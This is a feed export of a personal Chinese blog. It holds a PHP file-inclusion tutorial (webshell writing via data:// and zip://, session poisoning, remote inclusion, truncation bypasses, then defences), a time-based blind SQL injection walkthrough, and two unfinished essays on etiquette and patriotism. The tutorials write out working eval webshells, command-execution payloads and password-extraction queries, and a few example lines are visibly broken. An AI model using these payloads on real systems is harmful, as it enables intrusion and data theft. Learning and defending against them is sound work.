<h3 id="zip-x2F-x2F-（写入木马）"><a href="#zip-x2F-x2F-（写入木马）" class="headerlink" title="zip:&#x2F;&#x2F;（写入木马）"></a>zip:&#x2F;&#x2F;（写入木马）</h3><p><strong>利用条件：</strong><br>php版本大于等于php5.3.0<br>对allow_url_include不做要求。<br>对allow_url_fopen不做要求。<br><strong>方式：</strong><br>构造zip包的方法同phar。<br>写一个木马shell.php，其内容为<?php @eval($_POST[v]);?>，打包成zip压缩文件格式的压缩包。<br>但是使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用#，还要将#给URL编码为%23，之后填上压缩包内的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.4/fileinclude.php?file=zip://D:/phpStudy/PHPTutorial/WWW/test.zip%23shell.php</span><br></pre></td></tr></table></figure>
<p>先访问该url地址，然后小马就写进去了。<br>若是使用相对路径，则会getshell失败。<br>注意：<br>这里需要注意的和phar:&#x2F;&#x2F;中的注意一样，其中test.zip必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过test.zip的后缀可以不是zip，可以是像test.jpg，甚至test.111这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为test.111这样的后缀肯定不会被拦截了，这时就能成功。</p>
<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>数据流封装器，和php:&#x2F;&#x2F;相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。<br><strong>利用条件：</strong><br>php版本大于等于php5.2<br>allow_url_fopen &#x3D; On<br>allow_url_include &#x3D; On<br>方式一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>方式二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line">PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt;。其中加号+的url编码为%2b。如果不手动url编码会报错：Parse error: syntax error, unexpected &#x27;?&#x27; in data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8 on line 1</span><br></pre></td></tr></table></figure>

<h3 id="data-x2F-x2F-（命令执行）"><a href="#data-x2F-x2F-（命令执行）" class="headerlink" title="data:&#x2F;&#x2F;（命令执行）"></a>data:&#x2F;&#x2F;（命令执行）</h3><p><strong>利用条件：</strong><br>同上<br>方式一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<p>方式二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br><span class="line">其中PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==的base64解码为：&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="data-x2F-x2F-（写入木马）"><a href="#data-x2F-x2F-（写入木马）" class="headerlink" title="data:&#x2F;&#x2F;（写入木马）"></a>data:&#x2F;&#x2F;（写入木马）</h3><p><strong>利用条件：</strong><br>同上<br>方式一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain, &lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
<p>用shell管理工具，比如蚁剑等便能成功连接。<br>方式二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain;base64,PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==</span><br><span class="line">其中PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==的base64解码为：&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>


<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p><strong>利用条件：</strong><br>session文件路径已知，且其中内容部分可控。<br><strong>方式：</strong><br>php的session文件保存路径可以在phpinfo的session.save_path看到<br><img src="/simg/File_include_2.png" alt=" "><br>第二列是Local Value（局部变量），第三列是Master Value（主变量）。其中Master Value是PHP.ini文件中的内容。Local value是当前目录中的设置，这个值会覆盖Master Value中对应的值。所以看的是第二列当前目录中的设置D:\phpStudy\PHPTutorial\tmp\tmp。<br>常见的php-session存放位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line">session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</span><br></pre></td></tr></table></figure>
<p><img src="/simg/File_include_3.png" alt=" "><br>要包含并利用的话，需要能控制部分session文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
<ul>
<li><strong>例子1：</strong><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第3行</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 第8行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第20行</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$res_password</span>);</span><br><span class="line"><span class="comment"># 第24行</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res_password</span> == <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br></pre></td></tr></table></figure>
这里使用了session来保存用户会话:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 会将会话中的数据设置到 $_SESSION 变量中。</span><br><span class="line">当 PHP 停止的时候，它会自动读取 $_SESSION 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</span><br><span class="line">对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</span><br><span class="line">考虑到变量$username是我们可控的，并且被设置到了$_SESSION中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。</span><br><span class="line">要包含session文件，需要知道文件的路径。先注册一个用户，比如Johnson。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为0d0385dc6a1067f4e3406191（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为sess_cookie值）</span><br></pre></td></tr></table></figure>
访问：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://x.x.x.x/index.php?action=/var/lib/php5/sess_0d0385dc6a1067f4e3406191</span><br></pre></td></tr></table></figure>
其中&#x2F;var&#x2F;lib&#x2F;php5&#x2F;的session文件路径是测试出来的，常见的php-session存放位置在上面也有列出来了。<br>这里能包含，并且控制session文件，但要写入可用的payload，还需要绕过：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$username</span>);</span><br></pre></td></tr></table></figure>
如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，肯定会导致乱码。<br>那么这里需要考虑一下base64的编码过程。比如编码abc。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">未编码: abc</span><br><span class="line">转成ascii码： 97 98 99</span><br><span class="line">转成对应二进制（三组，每组8位）： 01100001 01100010 01100011</span><br><span class="line">重分组（四组，每组6位）： 011000 010110 001001 100011</span><br><span class="line">每组高位补零，变为每组8位：00011000 00010110 00001001 00100011</span><br><span class="line">每组对应转为十进制： 24 22 9 35</span><br><span class="line">查Base64编码表得： Y W J j</span><br></pre></td></tr></table></figure>
也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。</li>
</ul>
<p>那么这里注册一个账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnson&lt;?php eval($_GET[&#x27;abcdefg&#x27;]) ?&gt;,其base64加密后的长度为128，大于100。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为sess_cookie值）</span><br><span class="line"></span><br><span class="line">访问：http://x.x.x.x/index.php</span><br><span class="line">?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_0d0385dc6a1067f4e3406191</span><br><span class="line">&amp;abcdefg=phpinfo();</span><br><span class="line"></span><br><span class="line">成功执行，即成功getshell了</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>例子2：</strong><br>现在有一个session.php可控用户会话信息值：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br></pre></td></tr></table></figure>
可以看到这个session.php文件中的用户会话信息username的值是用户可控制的，那我们就可以传入恶意代码进行攻击利用。<br>如果这里有注册功能，那么我们先注册一个用户<?php phpinfo();?>。然后用其登录：username&#x3D;<?php phpinfo();?>。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为r7csmqpu1lul3elgsb6o9g6u1b。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，那么直接不注册输入<?php phpinfo();?>登录也能生成，名称都为sess_cookie值）<br>我们这里以上帝视角来查看下session文件，可见恶意代码被写入了：<br><img src="/simg/File_include_4.png" alt=" "><br>将恶意代码传入以后，接下来就要利用文件包含漏洞去包含这个恶意代码。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=D:\phpStudy\PHPTutorial\tmp\tmp\sess_r7csmqpu1lul3elgsb6o9g6u1b</span><br></pre></td></tr></table></figure>
<strong>注意命令执行和写入木马</strong>都是可以的，只要将上面的<?php phpinfo();?>替换成所对应的php代码，然后进行包含文件即可。</li>
</ul>
<p>今天写不动了，看看别人的博客吧，包含日志开始看。<br><a href="https://www.anquanke.com/post/id/248627#h3-7">php文件包含漏洞Getshell的不同姿势</a></p>
<h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><h2 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magic_quotes_gpc = Off php版本&lt;5.3.4</span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure>

<h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>条件：<br>windows OS，点号需要长于256；linux OS 长于4096</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txtspan><br></pre></td></tr></table></figure>

<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>条件：<br>windows OS，点号需要长于256<br>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txtspan><br></pre></td></tr></table></figure>


<h2 id="有限制远程文件包含漏洞绕过"><a href="#有限制远程文件包含漏洞绕过" class="headerlink" title="有限制远程文件包含漏洞绕过"></a>有限制远程文件包含漏洞绕过</h2><p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。</p>
<h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</span><br></pre></td></tr></table></figure>

<h3 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23</span><br></pre></td></tr></table></figure>

<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%20</span><br></pre></td></tr></table></figure>


<h1 id="文件包含漏洞的利用"><a href="#文件包含漏洞的利用" class="headerlink" title="文件包含漏洞的利用"></a>文件包含漏洞的利用</h1><h2 id="读写敏感文件"><a href="#读写敏感文件" class="headerlink" title="读写敏感文件"></a>读写敏感文件</h2><p>我们可以利用文件包含漏洞读取任意文件，读取文件的时候有利用条件</p>
<ul>
<li>目标主机文件还在(目标文件的路径，绝对路径，相对路径)</li>
<li>具有文件可读权限<br>读取本地host文件：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?path=c:/windows/System32/drivers/etc/hosts</span><br><span class="line">?path=../../../../../../../../windows/System32/drivers/etc/hosts</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="直接包含图片木马"><a href="#直接包含图片木马" class="headerlink" title="直接包含图片木马"></a>直接包含图片木马</h2><p>可以利用包含漏洞直接包含图片木马：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?path=./timg_.jpg</span><br></pre></td></tr></table></figure>
<p>使用蚁剑连接</p>
<h2 id="包含木马写shell"><a href="#包含木马写shell" class="headerlink" title="包含木马写shell"></a>包含木马写shell</h2><p>我们也可以将如下代码写入到图片中，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php @eval(\$_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;);?&gt;</span><br><span class="line">该段代码的含义是，在当前目录下创建一个名为shell.php文件，内容为&lt;?php phpinfo();?&gt; 当我们直接包含图片时，这段代码就会被执行</span><br></pre></td></tr></table></figure>

<h2 id="PHP-封装协议–访问本地文件"><a href="#PHP-封装协议–访问本地文件" class="headerlink" title="PHP 封装协议–访问本地文件"></a>PHP 封装协议–访问本地文件</h2><p>我们可以使用php的file协议访问本地系统文件，提交参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?path=file://c:/windows/System32/drivers/etc/hosts</span><br></pre></td></tr></table></figure>

<h2 id="PHP-封装协议–传输PHP文件"><a href="#PHP-封装协议–传输PHP文件" class="headerlink" title="PHP 封装协议–传输PHP文件"></a>PHP 封装协议–传输PHP文件</h2><p>可以使用以下参数来传输任意PHP文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?path=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<h2 id="PHP-封装协议–执行PHP命令"><a href="#PHP-封装协议–执行PHP命令" class="headerlink" title="PHP 封装协议–执行PHP命令"></a>PHP 封装协议–执行PHP命令</h2><p>我们可以利用PHP的封装协议来执行PHP命令。</p>
<h1 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h1><ol>
<li>无需情况下设置(在php.ini文件中)allow_url_include和allow_url_fopen为关闭，或者最小权限化</li>
<li>对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</li>
<li>尽量不使用动态包含</li>
<li>严格检查变量是否已经初始化。</li>
<li>严格检查输入的地址，不允许出现目录跳转符。尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现..&#x2F;之类的目录跳转符。</li>
<li>严格检查include类的文件包含函数中的参数是否外界可控。</li>
<li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li>
<li>在发布应用程序之前测试所有已知的威胁。</li>
</ol>
<ul>
<li>使用str_replace等方法过滤特殊字符，比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.  /  \  input  output  filter 等等</span><br></pre></td></tr></table></figure></li>
<li>指定包含的文件 （白名单）<br>我们在做网站开发的时候我们可能经常会使用我们文件包含的函数，但是我们呢包含的文件都是我们指定的文件，也就是我们知道我们需要包含什么文件。这样，我们在包含文件的时候就可以添加一条规则，让我们只能包含指定的文件，如果我们包含了非指定的文件，程序就会报错退出。</li>
<li>文件目录<br>php的配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置文件目录的话，我们编写的脚本只会在该目录中搜索文件，这样我们就可以把我们需要包含的文件放到这个目录就可以了，从而也避免了敏感文件的泄露。</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一个漏洞其实学得有点迷糊，主要是在包含方式那里。慢慢来吧，一回生二回熟。</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>时间盲注</title>
    <url>/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
<span id="more"></span>

<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时，甚至没有对错返回时，即可用此方式。</p>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second)函数"></a>sleep(second)函数</h2><p>延迟函数<br>作用：延迟second的时间<br>示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>

<h2 id="benchmark-count-expr-函数"><a href="#benchmark-count-expr-函数" class="headerlink" title="benchmark(count,expr)函数"></a>benchmark(count,expr)函数</h2><p>作用：可测试某些特定操作的执行速度<br>count：执行次数<br>expr：表达式,表示重复计算表达式count次，评估执行表达式的效率<br>expr表达式必须返回单个值，不允许返回多行记录或多列值，因此只能查询一个字段，且返回值只有1个，才适用于这个函数。<br>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">100</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
<li><p>判断数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure></li>
</ol>
<p>说明：建议写脚本，脚本有机会以后添加</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>时间盲注</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈礼仪的对象</title>
    <url>/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p>
<span id="more"></span>
<h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>礼仪</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈爱国</title>
    <url>/2022/11/26/%E6%B5%85%E8%B0%88%E7%88%B1%E5%9B%BD/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>爱国，似乎是一个不具有讨论性的话题。可能随便在街上问一个人，爱不爱国？恐怕都会答曰：爱国。<br>我仍然想讨论这个话题。</p>
<span id="more"></span>


<h1 id="爱国之问"><a href="#爱国之问" class="headerlink" title="爱国之问"></a>爱国之问</h1><p>为什么要爱国呢？是因为享受了国家的福祉而感恩？是因为为了更好的利益？是因为要政府的管理而顺从？还是因为寻求一种归属感？<br>爱国，到底是爱什么？是爱国家里的江山？人民？文化？政府？抑或皆有之。<br>要了解这些，首先需要知道，国家的性质有些什么。我查了下资料，大致上有这些：领土，政府，主权，人民，文化。</p>
<h1 id="爱国的部分"><a href="#爱国的部分" class="headerlink" title="爱国的部分"></a>爱国的部分</h1><p>既然要爱国，那这些也必定应当爱吧。领土和主权自不必谈，这里主要谈三个部分。</p>
<h2 id="政府"><a href="#政府" class="headerlink" title="政府"></a>政府</h2><p>政府（英语：Government）是一个政治体系，于某个区域订立、执行法律和管理的一套机构。<br>作为统治人民的机构，它做出对人民有利的事是应当的。因为政府在天然上占据了大量的优势，资源，信息都远超一般人民。倘若只占据好处而无所作为，那政府只是某些人用来谋取利益权势的工具。<br><font color=DarkRed>至于人民是否感谢政府，应当取决于人民自身的意愿，而不该带有强制要求去试图取代人民的感受。比如由政府带头大力宣传应当感激它自身，那恐怕只是一种政治目的或洗脑方式，必须要警惕。</font><br>爱国必然爱政府，当然爱是自由的，或许有的人能找到各种各样的理由爱政府，那没关系，我并不反对。<font color=DarkOliveGreen>只是有一点我必须要提出，爱必须要在了解的前提下才能谈。既然爱政府，那当然应该了解自己所在政府做了些什么事，尤其是对于擅长隐瞒事实的政府。只有在了解好坏并且接受之后，才能理直气壮地说自己爱政府。否则，我认为那只是一种偏见。如果连了解都不愿意真相都不接受，那只是愚蠢无知，没有谈下去的必要。</font></p>
<h2 id="人民"><a href="#人民" class="headerlink" title="人民"></a>人民</h2><p>人民（英语：People），又译居民、住民、国民，是个人（Person）的复数形集合。<br>国家里的人民，是整个人类的一部分，如果爱人类，那必然也爱人民。当然爱人民不代表爱人类。可一个声称自己爱国的人，会爱人民吗？我对此表示怀疑。当国民遭遇不幸时，是否会感到由衷地悲伤，还是说与我无关，抱着多一事不如少一事的心态。当国民在国际上取得名声时，是否会感到由衷地自豪，还是说无动于衷或是不屑一顾。爱国必然爱人民，如果做不到以上的事，那就不可能是爱人民。不仅如此，居庙堂而为非作歹，有余力却不愿施予。那更是与爱字沾不到边。<br><font color=darkblue>爱，是需要付出心力的，绝不是一句口号，一朝一夕之间的事。</font></p>
